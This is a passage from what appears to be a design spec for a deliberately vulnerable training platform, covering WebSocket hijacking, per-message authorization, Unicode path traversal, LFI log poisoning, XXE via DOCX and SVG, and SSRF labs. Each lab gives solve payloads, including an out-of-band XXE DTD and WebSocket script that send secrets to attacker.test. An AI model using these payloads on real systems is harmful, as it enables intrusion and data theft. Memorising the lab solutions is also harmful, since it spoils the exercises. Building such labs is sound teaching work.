  - Distinct from AR-10: the deputy follows **upstream** redirects, not a player URL.
- **Text.**
  - Title `{ id: 'Konsumsi API Hulu yang Tidak Aman', en: 'Unsafe Upstream API Consumption' }`.
  - Summary `{ id: 'Manfaatkan data dari Open Codex, API pihak ketiga yang dipercaya Arsip, untuk membocorkan rahasianya.', en: "Use data from Open Codex, a third-party API the Archive trusts, to leak the Archive's secrets." }`.
  - Hints:
    1. `{ id: 'Anda tidak bisa mengubah Arsip, tetapi Anda bisa mengubah catatan Anda sendiri di Open Codex.', en: "You can't change the Archive, but you can change your own record on Open Codex." }`
    2. `{ id: 'Data dari API "tepercaya" berakhir di kueri SQL yang sama seperti input lain.', en: "Data from a 'trusted' API ends up in a SQL query like any other input." }`
    3. `{ id: 'Di Inquisitor datanya diparameterkan. Ke mana klien HTTP Arsip pergi bila Open Codex menjawab dengan pengalihan?', en: "At Inquisitor the data is parameterized. Where does the Archive's HTTP client go when Open Codex answers with a redirect?" }`

### AR-14 — WebSocket CSWSH · `cswsh` (levels A/T/I/D)

Maps `A01:2025`, `CWE-1385`. State: `perSession` (world, admin browser, lab sessions, vault code, saved attacker page).
Restart. Engine: **E1 + E8**.

- **Goal.** From your page on attacker.test, read the admin's private WebSocket feed and open the vault.
- **Lab app.**
  - Sign in (pilgrim/pilgrim) sets `archive_session_<level>`. Its SameSite and Secure come from the **level file**
    (`sessionCookie`), shown in View Source, as in the CSRF labs (Phase 2 flagged change 5).
  - The feed socket `<lab>/ws`. On open it sends `{"type":"hello","user":…}` and the user's notices. The admin's
    notices include `{"type":"notice","text":"Vault code for today: <code>"}` (10 hex, per instance).
  - `POST <lab>/vault` takes `code` → flag below Divine.
  - The page's own client (`<lab>/client.js`) opens the socket for the signed-in player and shows the feed. At D it
    first fetches `<lab>/ws-ticket`.
- **Attacker page** (lab form "Your attacker page", stored per session as E1's `AttackerScript`):
  - page URL (attacker.test or a subdomain);
  - "sandboxed iframe" checkbox;
  - socket URL (default `ws://citadel.test/ws`);
  - up to 3 frames to send after open.

  It becomes `{ page: { url, sandboxed }, does: { kind: 'socket', url, send } }`.
- **Victim.** `visitAttackerPageAction({ browser: admin, page })`: the admin, signed in, opens your page. `rearm`
  re-sets the admin's `archive_session_<level>` cookie with the level's attributes
  (`admin.cookies.set(name, adminSid, { sameSite, secure })`).
- **Level interface:**
  - `sessionCookie: { sameSite: 'None' | 'Lax' | 'Strict'; secure: boolean }`;
  - `allowOrigin(origin: string | undefined, self: string) → boolean`;
  - `ticketRequired: boolean`.

  A missing Origin (a non-browser client) is allowed at every level: browsers always send one on a WebSocket handshake.
- **Levels.**
  - **A**: `sameSite: 'None', secure: true`; any Origin.
  - **T**: the same cookie; `origin.includes(new URL(self).hostname)` (substring) → `http://citadel.test.attacker.test`
    passes.
  - **I**: the same cookie; `[self, 'null'].includes(origin)` (exact, but `null` allowed "for the desktop app that
    loads from file://") → a sandboxed iframe sends `Origin: null`.
  - **D**:
    - `sameSite: 'Lax'`;
    - `origin === self` (or absent);
    - `?ticket=` must equal a per-session ticket from `GET <lab>/ws-ticket` (same-origin, cookie-authenticated, no
      CORS).

    ASVS 5.0 V4 (WebSocket: validate Origin and authenticate the handshake with a CSRF-safe token).
- **Flag proof.** The vault opened with the admin's code, below Divine. The code reaches the player only through the
  hijacked socket: your page forwards the admin's frames to the attacker log (`POST http://attacker.test/exfil`).
- **Solve.**
  - A: page `http://attacker.test/`, socket `ws://citadel.test/ws`, ask the admin to visit → read the code in the log →
    POST the vault.
  - T: page `http://citadel.test.attacker.test/`.
  - I: tick "sandboxed".
- **Matrix.**
  - `resisted` `Wrong vault code.` (the script sends `none` when no code arrived).
  - legit: sign in; GET `/ws-ticket`; `POST /ws/frames?ticket=<t>` `{"frames":["{\"op\":\"ping\"}"]}` → `pong` at
    every level.
  - malformed `[]`; privileged `null`.
  - Plus:
    - D's admin handshake from the attacker page carries no session cookie (Lax withheld) **and** is refused for
      Origin;
    - a real-WebSocket integration test (signed in, Node's global `WebSocket`, `Origin: http://127.0.0.1:<port>`)
      receives `hello`;
    - a real socket with `Origin: http://evil.example` gets 403 from the **platform** guard at every level;
    - `describeLabCookies` checks the per-level SameSite attributes.
- **Seams.** `vaultCode(sid, level)`, `labFor().admin`, `adminSid`.
- **Pitfalls.**
  - Below Divine the lab cookie must be `SameSite=None; Secure`, or the sim (correctly) withholds it and nothing is
    exploitable. Say so in View Source.
  - The **real** socket's Origin goes through the same `allowOrigin`, with `self` = the request's own origin, so the
    player's browser works at every level.
  - Distinct from FP-03 (CORS): WebSockets have **no read protection**; an accepted handshake gives everything away.
- **Text.**
  - Title `{ id: 'Pembajakan WebSocket Lintas Situs (CSWSH)', en: 'Cross-Site WebSocket Hijacking (CSWSH)' }`.
  - Summary `{ id: 'Dari halaman Anda di attacker.test, baca umpan WebSocket pribadi sang admin dan buka brankasnya.', en: "From your page on attacker.test, read the admin's private WebSocket feed and open the vault." }`.
  - Hints:
    1. `{ id: 'Jabat tangan WebSocket adalah permintaan HTTP biasa yang membawa cookie. Apa yang dibawa peramban admin?', en: "A WebSocket handshake is an ordinary HTTP request that carries cookies. What does the admin's browser bring?" }`
    2. `{ id: 'Tidak ada CORS untuk WebSocket: satu-satunya penjaga adalah server yang memeriksa header Origin.', en: 'There is no CORS for WebSockets: the only guard is the server checking the Origin header.' }`
    3. `{ id: 'Di Inquisitor daftar asal yang diizinkan memuat satu nilai khusus. Halaman macam apa yang mengirim nilai itu?', en: 'At Inquisitor the allowed-origins list holds one special value. What kind of page sends that value?' }`

### AR-15 — WebSocket missing per-message authz · `ws-message-authz` (levels A/T/I/D)

Maps `API5:2023`, `CWE-862`. State: `perSession` (chat sessions, rooms). Restart. Engine: **E8**.

- **Goal.** Read the message pinned in the curators' room through the Archive's chat socket.
- **Lab app.**
  - Sign in (pilgrim/pilgrim) sets `archive_chat_<level>` (HttpOnly, Lax).
  - Socket `<lab>/ws`, also over the fallback `POST <lab>/ws/frames`.
  - Rooms: `lobby` (public, pinned `Welcome, scribes.`) and `curators` (role `curator`, pinned `Curators' cipher:
    <flag below Divine | (sealed)>`).
  - Messages (JSON text frames):
    - `{"op":"join","room":r}` → `{"type":"joined","room":r,"pinned":…}`;
    - `{"op":"history","room":r}` → `{"type":"history","room":r,"messages":[…≤10]}`;
    - `{"op":"say","room":r,"text":t}` (≤ 200) → echoed to your socket;
    - `{"op":"ping"}` → `pong`.

    A bad message is `{"type":"error","text":…}`.
- **Level interface:** `authorize(user, msg) → true | string`, `targetRoom(msg) → string`.
- **Levels.**
  - **A**: the handshake requires a signed-in user; no message is authorized (`authorize` is always true).
  - **T**: `join` to `curators` checks the role; `history` and `say` do not.
  - **I**: every op checks `msg.room`, but the handler acts on `targetRoom(msg) = msg.roomId ?? msg.room` (`roomId` is
    "the new field; `room` kept for old clients").
  - **D**:
    - each op has an exact schema (unknown keys → `Unknown field: <k>.`);
    - there is one `room` field;
    - each message is authorized against the **current** role read from the session store (not cached at handshake);
    - unknown ops are denied.

    ASVS 5.0 V4 (WebSocket messages authorized individually), V8.
- **Flag proof.** A frame containing the curators' pinned message, below Divine.
- **Victim.** None.
- **Solve.**
  - A: `{"op":"join","room":"curators"}`.
  - T: `{"op":"history","room":"curators"}`.
  - I: `{"op":"history","room":"lobby","roomId":"curators"}`.
- **Matrix.**
  - `send` signs in, then POSTs `/ws/frames`.
  - `resisted` map: `{ acolyte: 'Curators only.', templar: 'Curators only.', inquisitor: 'Unknown field: roomId.' }`.
  - legit: `{"op":"join","room":"lobby"}` → `Welcome, scribes.`.
  - malformed `[]`.
  - privileged: a curator session (seam) joins `curators` at D → `(sealed)`, no flag.
  - Plus: the A exploit over a real WebSocket (integration), and the same frames at T showing `join` refused.
- **Seams.** `curatorSession(sid, level)`.
- **Pitfalls.**
  - Frames are JSON-parsed with a 4 KiB cap; arrays and non-objects give an error frame, never a throw.
  - Rooms are a fixed `Map`, so `__proto__` is a miss.
  - The fallback and the real socket run the same `SocketApp`; the spec checks equality on a corpus.
- **Text.**
  - Title `{ id: 'WebSocket Tanpa Otorisasi per Pesan', en: 'WebSocket Missing Per-Message Authorization' }`.
  - Summary `{ id: 'Baca pesan yang disematkan di ruang kurator lewat soket obrolan Arsip.', en: "Read the message pinned in the curators' room through the Archive chat socket." }`.
  - Hints:
    1. `{ id: 'Login terjadi sekali saat jabat tangan. Apakah setiap pesan sesudahnya juga diperiksa?', en: 'Sign-in happens once, at the handshake. Is every message after it checked too?' }`
    2. `{ id: 'Satu jenis pesan diperiksa; apakah semua jenis lain yang menyentuh ruang yang sama juga diperiksa?', en: 'One message type is checked; are all the others that touch the same room?' }`
    3. `{ id: 'Di Inquisitor pemeriksa membaca satu field. Apakah penangan membaca field yang sama?', en: 'At Inquisitor the checker reads one field. Does the handler read the same one?' }`

---

### B1. District rules — `scriptorium` SC-12 … SC-20

- These follow the SC-07/08/10/11 conventions (`scriptorium/_shared/lab.ts`: `receive`, `mountUpload`, `uploadCurl`;
  uploads at `POST /`; inert downloads).
- Flags in simulated files are written with `issueFlag(ID, sessionId, level)` inside the `perSession` factory, and
  `(sealed)` at Divine (the SC-11 pattern).
- **Network labs share a shell**, `scriptorium/_shared/net-lab.ts` (built in batch SC-B's first commit). It is plumbing
  only:
  - `newNetLab(level, sessionId, { hosts?, services?, imds? })` builds `simWorld({ inbox: false })` and `simNet` with the
    common services, inside the factory:
    - **the Archivist Console** on loopback `:8080`: `GET /` gives "Archivist Console: internal only. See /admin/keys",
      and `GET /admin/keys` gives `Master key: <flag below Divine | (sealed)>`;
    - **the scroll CDN** `scrolls.citadel.test` (203.0.113.20:80): `/psalter.txt`, `/hours.txt`, and `/go?to=<url>`,
      which answers `302 Location: <to>` (the CDN's own "link tracker", identical at every level).
  - `fetchView(result)` and the partial `views/fetch-result.ejs` (status, content type, a body preview ≤ 2 KiB, all
    escaped).
  - `describeNetLab` (test kit): the panel forms, trace rendering and isolation.
  - Every check and every fetch policy stays in `levels/*.ts`.
- **No XSS oracle anywhere in this batch.** Player XML is parsed only by `core/xmldtd`. Stored uploads go back only as
  inert downloads (RECIPES §9).

---

### SC-12 — Path traversal via Unicode normalisation · `unicode-traversal` (levels A/I/D)

Maps `A01:2025`, `CWE-22`, `CWE-176`. State: `perSession` simFs (read-only, all files pinned). No Restart.
**Catalog title change proposed** (C, item 1).

- **Goal.** Download the vault file from the Old Gateway, past its path filter.
- **Page.**
  - "The Old Gateway" scroll download: `GET <lab>/fetch?name=<name>`.
  - Public files `/srv/gateway/public/hymnal.txt` and `rubric.txt`. The vault is `/srv/gateway/vault/flag.txt` (flag
    per session and level; `(sealed)` at Divine).
  - A form (GET, field `name`) and a note: "the gateway reads the raw query string; for byte-exact requests use the
    address bar or `curl --path-as-is`".
- **The raw query is the input at every level.** `rawParam(req, 'name')` in `model.ts`:
  - takes `req.originalUrl` after the first `?`, splits it on `&`, and returns the first `name=` value still
    percent-encoded;
  - caps it at 1024 characters, else 414 `Name too long.`.
  - Express's decoded `req.query` is never used, so this lab does **not** repeat SC-11's Express-decode-once lesson.
- **Level interface:** `separators`, `read(fs, raw) → Read`.
- **Levels.**
  - **A** ("legacy gateway").
    - The check runs on the **raw** text: refuse if it contains `../`, `..\` or a percent escape of `.`, `/` or `\`
      (`%2e`, `%2f`, `%5c`, case-insensitive).
    - Then the gateway's own **legacy UTF-8 decoder** decodes it: percent-decode to bytes, then decode UTF-8 accepting
      the **overlong** two- and three-byte forms of ASCII (`C0 AE` → `.`, `C0 AF` → `/`, `E0 80 AE` → `.`, `C1 9C` →
      `\`). Any other invalid sequence becomes U+FFFD.
    - It joins under `/srv/gateway/public/` and reads.
    - This is the IIS "Unicode" traversal (CVE-2000-0884).
  - **I**.
    - Strict decoding: `decodeURIComponent(raw)`. Overlong forms throw → 400 `Invalid encoding.`.
    - Then a real check on the **decoded** name: no `..` segment on either separator, no leading `/`.
    - **Then** `name.normalize('NFKC')` ("so look-alike filenames, full-width letters and ligatures, find the same
      scroll").
    - Then join and read.
    - NFKC turns full-width `．．／` (U+FF0E U+FF0E U+FF0F) and the two-dot leader `‥` (U+2025) into `../`. Measured on
      Node 22.22: `'．．／vault／flag.txt'.normalize('NFKC') === '../vault/flag.txt'`.
  - **D**.
    - Strict decoding, then the name must match `^[A-Za-z0-9._-]{1,64}$` (so no normalisation question arises).
    - Then the RECIPES §9 containment check on `fs.resolve('/srv/gateway/public/' + name)`.
    - Every refusal and miss is the same `404 No such scroll.`.
    - ASVS 5.0 V5 (file paths built only from validated names), V1 (canonicalise before validating).
- **Flag proof.** The response body is the vault file.
- **Victim.** None.
- **Solve.**
  - A: `?name=%c0%ae%c0%ae%c0%afvault%c0%afflag.txt`.
  - I: `?name=%EF%BC%8E%EF%BC%8E%EF%BC%8Fvault%EF%BC%8Fflag.txt` (typing `．．／vault／flag.txt` into the form works too:
    the browser encodes it as UTF-8).
- **Matrix.**
  - `resisted` `No such scroll.`; `resistedStatus` 404.
  - legit: `?name=hymnal.txt` → `Hymnal of the Gate`.
  - malformed `[]`; privileged `null`.
  - Plus: A's payload at I → 400 `Invalid encoding.`; the legacy decoder's table is pinned (overlong `.` `/` `\` only;
    everything else invalid → U+FFFD).
- **Seams.** `VAULT_FLAG`, `rawParam`.
- **Pitfalls.**
  - Read only the raw query (never `req.query`). Bound it. Treat `+` literally.
  - The legacy decoder must stay linear (an index loop, no regex on attacker text).
  - nginx keeps the query unchanged (`merge_slashes off`; query untouched).
  - Distinct from SC-11 (Express decodes once, then a double encoding) and SA-05 (Unicode in authentication).
- **Text.**
  - Title `{ id: 'Path Traversal lewat Normalisasi Unicode', en: 'Path Traversal via Unicode Normalisation' }`.
  - Summary `{ id: 'Unduh berkas brankas dari Gerbang Lama, melewati penyaring jalurnya.', en: 'Download the vault file from the Old Gateway, past its path filter.' }`.
  - Hints:
    1. `{ id: 'Gerbang membaca nama dari query mentah dan men-dekodenya sendiri. Dekoder macam apa?', en: 'The gateway reads the name from the raw query and decodes it itself. What kind of decoder?' }`
    2. `{ id: 'UTF-8 punya satu cara benar untuk menulis titik; dekoder lama menerima cara yang lebih panjang.', en: 'UTF-8 has one correct way to write a dot; old decoders accept longer ones.' }`
    3. `{ id: 'Di Inquisitor dekodernya ketat, tetapi namanya diubah lagi setelah diperiksa. Karakter apa yang berubah menjadi titik atau garis miring?', en: 'At Inquisitor the decoder is strict, but the name is changed again after the check. Which characters turn into a dot or a slash?' }`

### SC-13 — LFI → log poisoning · `lfi-log-poisoning` (levels A/I/D)

Maps `A05:2025`, `CWE-98`, `CWE-117`. State: `perSession` simFs (pages and logs). Restart. Needs `simInclude` (S3).

- **Goal.** Make the simulated server run a statement from its own log file.
- **Page.**
  - "Scriptorium help": `GET <lab>/?page=<name>` (default `about`) includes the page file through `simInclude` and
    shows the output escaped in a `<pre>`.
  - Links to `about`, `rules` and `contact`.
  - The page documents the simulated server's one statement, `<?hvwa CANARY ?>`. It is the server's language, as in
    SC-07/08/09, not a payload.
- **Simulated files** (pinned):
  - `/srv/app/pages/{about,rules,contact}` (plain text);
  - `/var/log/scriptorium/access.log` (combined format, the newest 20 lines);
  - `/srv/app/storage/logs/app.log` (Laravel-style `[time] production.ERROR: Page not found: "<page>"`, the newest 20
    lines);
  - `/etc/hostname`.
- **Logging (model).** After each lab request's response is built, `model.ts` appends the access-log line (A6). An
  unknown page appends the app-log line. Field escaping is the level's `logField(s)`.
- **Level interface:** `resolvePage(fs, page) → path | string`, `logField(s) → string`.
- **Levels.**
  - **A**: `include('/srv/app/pages/' + page)`, unchecked (the simulated OS resolves `..`). Logs are raw.
  - **I**:
    - Includes are confined to the **application root**: `path = fs.resolve('/srv/app/pages/' + page)` and refuse
      unless `path.startsWith('/srv/app/')` (`That page is outside the application.`). "Anything inside our app is
      ours."
    - Logs are raw. The access log is now unreachable, but the app's own error log is under `/srv/app/storage/logs/`.
  - **D**:
    - `page` must be a key of a fixed `Map` (`about`, `rules`, `contact` → fixed paths); anything else is `404 No such
      page.` and nothing player-written is included.
    - Logs escape `<`, `>`, `"` and control characters as `\xNN` (defense in depth, as a comment says).
    - ASVS 5.0 V5 (no file inclusion from user input), V16 (log encoding).
- **Flag proof.** The include output contains the canary: `simInclude(bytes, () => flagFor(req, C))`; the statement in
  the included log is replaced by the flag.
- **Victim.** None.
- **Solve.**
  - A:
    1. any request with `User-Agent: <?hvwa CANARY ?>`;
    2. `?page=../../../var/log/scriptorium/access.log`.
  - I:
    1. `?page=<?hvwa CANARY ?>` (URL-encoded; logged as "Page not found");
    2. `?page=../storage/logs/app.log`.
- **Matrix.**
  - `send` fires the poison request, then the include request (`curl -A` on the page).
  - `resisted` `No such page.`; `resistedStatus` 404.
  - legit: `?page=rules` → `Rules of the Scriptorium`.
  - malformed `[]`; privileged `null`.
  - Plus: a poisoned line appears only for the **next** request; D's logs hold the escaped statement and including them
    is impossible anyway; Restart restores empty logs.
- **Seams.** `labFor().fs`, `ACCESS_LOG`, `APP_LOG`.
- **Pitfalls.**
  - Every lab request writes a log line (that is the lesson). It is bounded (20 lines, fields clipped) and per player and
    level.
  - Show the include output escaped; never echo raw bytes as HTML.
  - `simInclude` replaces only the known statement.
  - Distinct from SC-11/12 (reading a file): here the server **interprets** a file whose content you planted indirectly.
- **Text.**
  - Title `{ id: 'LFI ke Peracunan Log', en: 'LFI to Log Poisoning' }`.
  - Summary `{ id: 'Buat server yang disimulasikan menjalankan pernyataan dari berkas log-nya sendiri.', en: 'Make the simulated server run a statement from its own log file.' }`.
  - Hints:
    1. `{ id: 'Halaman bantuan disertakan dari berkas. Berkas lain apa yang bisa disertakan?', en: 'Help pages are included from files. What other files could be included?' }`
    2. `{ id: 'Server mencatat setiap permintaan, termasuk bagian yang Anda tulis sendiri.', en: 'The server logs every request, including parts you write yourself.' }`
    3. `{ id: 'Di Inquisitor penyertaan dibatasi ke folder aplikasi. Log apa yang ditulis aplikasi di dalam foldernya sendiri, dan apa isinya?', en: 'At Inquisitor includes are confined to the app folder. Which log does the app write inside its own folder, and what goes into it?' }`

### SC-14 — XXE via DOCX · `xxe-docx` (levels A/T/I/D)

Maps `A05:2025`, `CWE-611`. State: `perSession` (world without inbox, simNet, simFs). Restart. Engine: **E5, E6** (+ E2
`readZip`).

- **Goal.** Upload a `.docx` manuscript that makes the server's XML parser read the secret commission file.
- **Page.**
  - "Submit a manuscript (.docx)": upload at `POST /` (`mountUpload`, `maxFileBytes: 512 KiB`).
  - A sample download `<lab>/sample.docx` (`fixtures/manuscript.docx`, minimal: `[Content_Types].xml`,
    `word/document.xml`, `docProps/core.xml`; made with Python's `zipfile`, documented).
  - The result shows `Title`, `Author`, `Words` and a 300-character preview, all escaped.
  - The sim panel shows your DNS, your server (`evil.dtd` lives there) and the attacker log.
- **Simulated machine** (simFs, pinned):
  - `/etc/hostname` = `scriptorium-01`;
  - `/etc/passwd` (5 fictional lines);
  - `/srv/scriptorium/manuscripts/secret-commission.txt` = the flag, one line **without** a trailing newline (it must
    survive inside a URL).
  - The upload is never stored; parts are read with `readZip(bytes, { totalBytes: 256 KiB })`. `word/document.xml` is
    required and `docProps/core.xml` is optional; each part is ≤ 64 KiB.
- **Parsing.** `parseXml(part, { baseUri: 'file:///srv/scriptorium/uploads/' + partName, …level options, resolve:
  xmlResolver({ fs, net }) })` inside `tryDb(…, 'Parser error')`.
  - Title and author come from `dc:title` / `dc:creator` in core.xml.
  - Words and preview come from `w:t` in document.xml.
- **Level interface:** `options(part) → XmlParseOptions` (minus `resolve`/`baseUri`), `prefilter(parts) → true | string`.
- **Levels.**
  - **A**: `{ dtd: 'load', externalGeneral: true, externalParameter: true, xinclude: false }` for both parts.
  - **T**: the same options. `prefilter` refuses an upload whose **`word/document.xml`** contains `<!DOCTYPE`
    (case-insensitive) — "we scan the document body". But `docProps/core.xml` (the title) is parsed with the same
    options.
  - **I**:
    - `{ dtd: 'load', externalGeneral: false, externalParameter: true }` for both parts: external **general** entities
      are no longer loaded (they expand to nothing).
    - The DTD and parameter entities still load over the (simulated) network — "the Word add-in's template DTD".
    - Parse errors are shown verbatim below Divine.
  - **D**: `{ dtd: 'refuse' }` on every part (`DOCTYPE is not allowed.`), no XInclude, no external resolution. ASVS 5.0
    V1/V5 (XML parsers with DTDs and external entities disabled).
- **Flag proof** (below Divine):
  - A/T: the title, author or preview shows the file (the flag).
  - I: the flag lands in your attacker log in the URL of a server-side request (out-of-band), **or** in the parser
    error (error-based).
- **Victim.** None. The server's parser is the target.
- **Solve.**
  - A: in `word/document.xml`, `<!DOCTYPE w:document [<!ENTITY x SYSTEM "file:///srv/scriptorium/manuscripts/secret-commission.txt">]>`
    and `<w:t>&x;</w:t>`.
  - T: the same DOCTYPE and entity in `docProps/core.xml`, used as `<dc:title>&x;</dc:title>`.
  - I:
    1. Your server route `/evil.dtd` (`application/xml-dtd`):
       `<!ENTITY % file SYSTEM "file:///srv/scriptorium/manuscripts/secret-commission.txt"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.test/x?d=%file;'>">%eval;%exfil;`
    2. In document.xml: `<!DOCTYPE w:document [<!ENTITY % remote SYSTEM "http://attacker.test/evil.dtd"> %remote;]>`.
    3. Read `GET http://attacker.test/x?d=HVWA{…}` in the log.

    The error-based variant (`file:///nonexistent/%file;`) is accepted too.
- **Matrix.**
  - Uploads are built with `zipOf` from `tests/support/uploads.ts`. The I script first sets the server route through
    `POST /sim/server`.
  - `resisted` `DOCTYPE is not allowed.`.
  - legit: the sample DOCX → `Title: The Copyist's Rule`.
  - malformed: a document.xml that is not well-formed → `Parser error` at A/T/I.
  - privileged `null`.
- **Seams.** `labFor().fs`, `labFor().net`, `COMMISSION`.
- **Pitfalls.**
  - The internal-subset PE rule (A4) is why I needs an **external** DTD. The spec pins that the same three declarations
    inline are refused with `PEReferences forbidden in internal subset`.
  - Keep the flag file single-line.
  - Never send any part to the XSS oracle, and never store or serve the upload.
  - Distinct from SC-15: a package (DOCX parts) and out-of-band/error-based, vs SVG with a relative system id and
    XInclude.
- **Text.**
  - Title `{ id: 'XXE lewat DOCX', en: 'XXE via DOCX' }`.
  - Summary `{ id: 'Unggah naskah .docx yang membuat parser XML server membaca berkas komisi rahasia.', en: "Upload a .docx manuscript that makes the server's XML parser read the secret commission file." }`.
  - Hints:
    1. `{ id: 'Berkas .docx adalah arsip ZIP berisi beberapa dokumen XML.', en: 'A .docx file is a ZIP archive of several XML documents.' }`
    2. `{ id: 'Penyaring Templar memeriksa satu bagian paket. Bagian mana lagi yang diurai server?', en: "Templar's filter checks one part of the package. Which other part does the server parse?" }`
    3. `{ id: 'Di Inquisitor entitas umum eksternal mati, tetapi DTD masih dimuat. Apa yang bisa dilakukan entitas parameter dari DTD di server Anda sendiri?', en: 'At Inquisitor external general entities are off, but DTDs still load. What can parameter entities do from a DTD on your own server?' }`

### SC-15 — XXE via SVG · `xxe-svg` (levels A/T/I/D)

Maps `A05:2025`, `CWE-611`. State: `perSession` (world without inbox, simNet, simFs). Restart. Engine: **E5, E6** (+ E2
upload).

- **Goal.** Upload an SVG that makes the server's thumbnailer read the sigil flag file.
- **Page.**
  - "Sigil thumbnailer": upload an SVG (`maxFileBytes: 64 KiB`). The server parses it and shows a "thumbnail report":
    `width`, `height`, and the text the rasteriser would draw (`title`, `desc` and `text` elements in the SVG namespace,
    joined, ≤ 300 characters, escaped).
  - The SVG itself is never shown inline and never judged by the XSS oracle.
  - The sim panel is shown (needed only for curiosity; no level needs out-of-band).
- **Simulated machine** (pinned): `/etc/hostname`, and `/srv/scriptorium/sigils/flag.txt` = the flag. The upload's base
  URI is `file:///srv/scriptorium/uploads/sigil.svg`.
- **Level interface:** `options → XmlParseOptions` (minus `resolve`/`baseUri`), `prefilter(text) → true | string`.
- **Levels.**
  - **A**: `{ dtd: 'load', externalGeneral: true, externalParameter: true, xinclude: false }`.
  - **T**: the same options. `prefilter` refuses the upload if the raw text contains `file://` or `http://`
    (case-insensitive): "external URLs are not allowed". A system identifier **without a scheme** (`/srv/…`, `../…`) is
    resolved against the document's base URI to `file:` by the parser. `file:/srv/…` (one slash) also passes.
  - **I**: `{ dtd: 'refuse', xinclude: true }`. DOCTYPEs are refused (the team fixed XXE), but the thumbnailer processes
    **XInclude** ("designers compose sigils from shared parts"), with `parse="text"` allowed and `file:` hrefs resolved.
  - **D**: `{ dtd: 'refuse', xinclude: false }`, no external resolution of any kind. Text is extracted as written.
    ASVS 5.0 V1/V5.
- **Flag proof.** The thumbnail report's text contains the flag, below Divine.
- **Victim.** None.
- **Solve.**
  - A: `<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///srv/scriptorium/sigils/flag.txt">]><svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>`.
  - T: the same with `SYSTEM "/srv/scriptorium/sigils/flag.txt"` (or `"../sigils/flag.txt"`).
  - I: `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude"><text><xi:include href="file:///srv/scriptorium/sigils/flag.txt" parse="text"/></text></svg>`.
- **Matrix.**
  - `resisted` map: `{ acolyte: 'DOCTYPE is not allowed.', templar: 'DOCTYPE is not allowed.', inquisitor: 'Thumbnail ready.' }`.
    At D the unprocessed `xi:include` draws nothing.
  - legit: `<svg xmlns=…><text>Ave</text></svg>` → `Ave`.
  - malformed: `<svg` → `Parser error` at A/T/I.
  - privileged `null`.
- **Seams.** `SIGIL_FLAG`, `labFor().fs`.
- **Pitfalls.**
  - The XInclude element is matched by **namespace URI**, never by prefix.
  - Relative system ids resolve against `baseUri` with WHATWG `URL` (A4).
  - Never inline the upload; serve it back only as an inert download.
  - Distinct from SC-05 (client-side SVG XSS through the oracle): this lab is purely the **server** parser.
- **Text.**
  - Title `{ id: 'XXE lewat SVG', en: 'XXE via SVG' }`.
  - Summary `{ id: 'Unggah SVG yang membuat pembuat thumbnail server membaca berkas bendera sigil.', en: "Upload an SVG that makes the server's thumbnailer read the sigil flag file." }`.
  - Hints:
    1. `{ id: 'Pembuat thumbnail mengurai SVG sebagai XML dan menggambar teksnya.', en: 'The thumbnailer parses the SVG as XML and draws its text.' }`
    2. `{ id: 'Pengidentifikasi sistem tidak selalu butuh skema; ia diselesaikan terhadap alamat dokumen itu sendiri.', en: "A system identifier doesn't always need a scheme; it is resolved against the document's own address." }`
    3. `{ id: 'Di Inquisitor DOCTYPE ditolak. Adakah cara XML lain untuk menarik isi berkas lain ke dalam dokumen?', en: "At Inquisitor DOCTYPEs are refused. Is there another XML way to pull another file's contents into the document?" }`

### SC-16 — SSRF fetch-from-URL · `ssrf-fetch` (levels A/T/I/D)

Maps `A01:2025`, `CWE-918`. State: `perSession` (net lab). Restart. Engine: **E5**.

- **Goal.** Make the scroll import feature read the Archivist's internal console.
- **Page.**
  - "Import a scroll from a URL" (field `url`). The server fetches it and shows the status, the content type and a
    preview.
  - The fetch trace (hops: URL, address, status).
  - The sim panel.
- **Level interface:** `importScroll(net, url) → FetchView | string`.
- **Levels.**
  - **A**: `net.fetch(url)`, unchecked, following redirects.
  - **T**: `url.startsWith('http://scrolls.citadel.test')` (an allowlist by prefix), then fetch.
  - **I**:
    - WHATWG parse; require `protocol === 'http:'` and `hostname === 'scrolls.citadel.test'` exactly.
    - Then `net.fetch(url)` with `redirect: 'follow'`, and nothing re-checks the hops.
    - The CDN's own `/go?to=` tracker is an open redirect on the allowlisted host.
  - **D**:
    - The exact host allowlist.
    - `redirect: 'manual'` with the level's own loop: every hop is re-validated against the allowlist (`Redirect target
      not allowed.`).
    - Resolved addresses must pass `isPublicAddress`.
    - Only `text/plain` bodies.

    ASVS 5.0 V1 (SSRF allowlists applied to every request, redirects included).
- **Flag proof.** The preview contains `Master key: <flag>` from the console.
- **Victim.** None.
- **Solve.**
  - A: `http://localhost:8080/admin/keys`.
  - T: `http://scrolls.citadel.test@localhost:8080/admin/keys` (userinfo; WHATWG's host is `localhost`).
  - I: `http://scrolls.citadel.test/go?to=http://localhost:8080/admin/keys`.
- **Matrix.**
  - `resisted` map:
    `{ acolyte: 'Only scrolls from scrolls.citadel.test can be imported.', templar: 'Only scrolls from scrolls.citadel.test can be imported.', inquisitor: 'Redirect target not allowed.' }`.
  - legit: `http://scrolls.citadel.test/psalter.txt` → `Psalter`.
  - malformed: `http://[` → `Fetch error: TypeError: Invalid URL` at `['acolyte']`.
  - privileged `null`.
- **Seams.** `labFor().net`.
- **Pitfalls.**
  - The console listens on every loopback address (A3), so `127.1` and friends also reach it at A. That is fine at A;
    SC-18 owns the spelling lesson.
  - The trace never shows bodies.
  - Distinct from SC-17/18/19 and AR-10: this lab's rungs are **prefix allowlist (userinfo)** and **open redirect on an
    allowed host**.
- **Text.**
  - Title `{ id: 'SSRF Ambil-dari-URL', en: 'SSRF Fetch-from-URL' }`.
  - Summary `{ id: 'Buat fitur impor gulungan membaca konsol internal Arsiparis.', en: "Make the scroll import feature read the Archivist's internal console." }`.
  - Hints:
    1. `{ id: 'Server yang mengambil URL itu, dari dalam jaringannya sendiri. Apa yang hanya bisa dijangkau dari sana?', en: 'The server fetches the URL, from inside its own network. What can only be reached from there?' }`
    2. `{ id: 'Sebuah URL yang diawali nama host tepercaya belum tentu menuju host itu.', en: 'A URL that starts with a trusted host name does not necessarily go to that host.' }`
    3. `{ id: 'Di Inquisitor host-nya harus persis. Apa yang dilakukan host tepercaya itu dengan tautan /go-nya?', en: 'At Inquisitor the host must match exactly. What does that trusted host do with its /go links?' }`

### SC-17 — SSRF → cloud metadata (fake IMDS) · `ssrf-metadata` (levels A/T/I/D)

Maps `A01:2025`, `CWE-918`, `CWE-522`. State: `perSession` (net lab with IMDS, tokens). Restart. Engine: **E5**.

